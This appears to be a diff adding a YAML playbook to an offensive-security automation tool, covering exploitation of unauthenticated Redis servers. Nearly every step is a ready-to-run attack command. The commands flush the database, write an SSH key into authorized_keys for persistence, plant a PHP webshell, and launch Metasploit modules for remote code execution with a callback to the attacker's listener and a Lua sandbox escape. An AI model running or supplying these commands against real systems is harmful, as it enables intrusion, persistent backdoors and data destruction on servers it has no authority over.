@@ -1,0 +1,40 @@
+id: service_redis_unauth
+title: "Redis — unauth → SSH key write → webshell → RCE"
+phase: exploit
+mitre: ["T1190", "T1078.001", "T1078.003"]
+trigger:
+  services: ["redis"]
+  ports:    [6379, 6380]
+  cves:     ["CVE-2022-0543"]
+keywords: ["redis", "redis unauth", "redis rce", "config rewrite"]
+preconditions:
+  - "TCP/6379 reachable"
+  - "redis-cli installed locally"
+steps:
+  - tool: redis-cli
+    cmd:  "redis-cli -h {target} -p 6379 INFO server"
+    why:  "Confirm unauth + extract version + redis_mode (cluster/standalone)"
+  - tool: nmap
+    cmd:  "nmap -sV -p6379 --script=redis-info,redis-brute {target}"
+    why:  "Banner + light cred spray when AUTH required"
+  - tool: redis-cli
+    cmd:  "redis-cli -h {target} -p 6379 CONFIG GET dir; redis-cli -h {target} -p 6379 CONFIG GET dbfilename"
+    why:  "Find writable redis data dir — required for next steps"
+  - tool: redis-cli
+    cmd:  "redis-cli -h {target} -p 6379 FLUSHALL; redis-cli -h {target} -p 6379 CONFIG SET dir /home/{user}/.ssh/; redis-cli -h {target} -p 6379 CONFIG SET dbfilename authorized_keys; (echo; cat ~/.ssh/id_rsa.pub; echo) | redis-cli -h {target} -p 6379 -x SET crackit; redis-cli -h {target} -p 6379 SAVE"
+    why:  "Classic redis SSH key persistence — 30 sec to root if redis runs as user with .ssh dir"
+  - tool: redis-cli
+    cmd:  "redis-cli -h {target} -p 6379 CONFIG SET dir /var/www/html/; redis-cli -h {target} -p 6379 CONFIG SET dbfilename shell.php; redis-cli -h {target} -p 6379 SET test '<?php system($_GET[\"c\"]); ?>'; redis-cli -h {target} -p 6379 SAVE"
+    why:  "Webshell drop when Apache/Nginx + PHP on same host"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS {target}; set LHOST {LHOST}; set LPORT {LPORT}; run'"
+    why:  "Master-replica CMD exec (Redis 4.x/5.x) — full RCE without filesystem dependency"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/linux/redis/redis_debian_sandbox_escape; set RHOSTS {target}; run'"
+    why:  "CVE-2022-0543 Debian-package Lua sandbox escape"
+expected_outcome: "RCE as redis user → privesc via cron/SUID; SSH foothold via authorized_keys write"
+fallbacks:
+  - "Cluster mode → bypass via CLUSTER SLOTS to find writable nodes"
+  - "If only DEBUG enabled → DEBUG SLEEP for time-based confirmation"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
